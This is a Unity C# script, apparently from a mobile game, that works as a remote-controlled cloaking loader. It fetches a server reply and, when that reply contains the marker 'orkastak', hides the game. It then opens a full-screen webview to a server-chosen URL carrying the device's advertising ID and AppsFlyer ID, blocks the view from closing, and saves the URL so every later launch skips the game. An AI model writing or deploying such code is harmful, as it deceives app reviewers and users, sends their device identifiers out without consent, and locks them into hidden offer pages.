using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.Serialization;

public class SomeShit : MonoBehaviour
{
    [SerializeField] private Canvas LogoCanvas;
    [SerializeField] private List<string> SomeOfferLink;
    private string _someIdfaData = "";
    private string _someCollectedLink = "";
    
    private const string RandomKey = "RandomKey";
    private const string SomeLoaderKey = "SomeLoaderKey";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("autorizet") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { _someIdfaData = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString(RandomKey, string.Empty) != string.Empty)
            {
                LoadSomeShit(PlayerPrefs.GetString(RandomKey));
            }
            else
            {
                foreach (string n in SomeOfferLink)
                {
                    _someCollectedLink += n;
                }
                StartCoroutine(WebviewInitCoroutine());
            }
        }
        else
        {
            LoadMenuScene();
        }
    }

    private void LoadMenuScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        UnityEngine.SceneManagement.SceneManager.LoadScene("GameScene");
    }

    private IEnumerator WebviewInitCoroutine()
    {
        using (UnityWebRequest webRequest = UnityWebRequest.Get(_someCollectedLink))
        {

            yield return webRequest.SendWebRequest();
            if (webRequest.isNetworkError)
            {
                LoadMenuScene();
            }
            int timerloader = 7;
            while (PlayerPrefs.GetString(SomeLoaderKey, "") == "" && timerloader > 0)
            {
                yield return new WaitForSeconds(1);
                timerloader--;
            }
            try
            {
                if (webRequest.result == UnityWebRequest.Result.Success)
                {
                    if (webRequest.downloadHandler.text.Contains("orkastak"))
                    {

                        try
                        {
                            var subs = webRequest.downloadHandler.text.Split('|');
                            LoadSomeShit(subs[0] + "?idfa=" + _someIdfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(SomeLoaderKey, ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {

                            LoadSomeShit(webRequest.downloadHandler.text + "?idfa=" + _someIdfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString(SomeLoaderKey, ""));
                        }
                    }
                    else
                    {
                        LoadMenuScene();
                    }
                }
                else
                {
                    LoadMenuScene();
                }
            }
            catch
            {
                LoadMenuScene();
            }
        }
    }

    private void LoadSomeShit(string jijsda, string mvcnma = "", int hues = 70)
    {
        if (LogoCanvas != null)
        {
            LogoCanvas.gameObject.SetActive(false);
        }
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var webViewConfig = gameObject.AddComponent<UniWebView>();
        webViewConfig.SetAllowFileAccess(true);
        webViewConfig.SetShowToolbar(false);
        webViewConfig.SetSupportMultipleWindows(false, true);
        webViewConfig.SetAllowBackForwardNavigationGestures(true);
        webViewConfig.SetCalloutEnabled(false);
        webViewConfig.SetBackButtonEnabled(true);

        webViewConfig.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        webViewConfig.SetToolbarDoneButtonText("");
        switch (mvcnma)
        {
            case "0":
                webViewConfig.EmbeddedToolbar.Show();
                break;
            default:
                webViewConfig.EmbeddedToolbar.Hide();
                break;
        }
        webViewConfig.Frame = new Rect(0, hues, Screen.width, Screen.height - hues * 2);
        webViewConfig.OnShouldClose += (view) =>
        {
            return false;
        };
        webViewConfig.SetSupportMultipleWindows(true);
        webViewConfig.SetAllowBackForwardNavigationGestures(true);
        webViewConfig.OnMultipleWindowOpened += (view, windowId) =>
        {
            webViewConfig.EmbeddedToolbar.Show();
        };
        webViewConfig.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (mvcnma)
            {
                case "0":
                    webViewConfig.EmbeddedToolbar.Show();
                    break;
                default:
                    webViewConfig.EmbeddedToolbar.Hide();
                    break;
            }
        };
        webViewConfig.OnOrientationChanged += (view, orientation) =>
        {
            webViewConfig.Frame = new Rect(0, hues, Screen.width, Screen.height - hues);
        };

        webViewConfig.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var url = value as string;

                webViewConfig.Load(url);
            }
        };
        webViewConfig.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString(RandomKey, string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString(RandomKey, url);
            }
        };
        webViewConfig.Load(jijsda);
        webViewConfig.Show();
    }
}
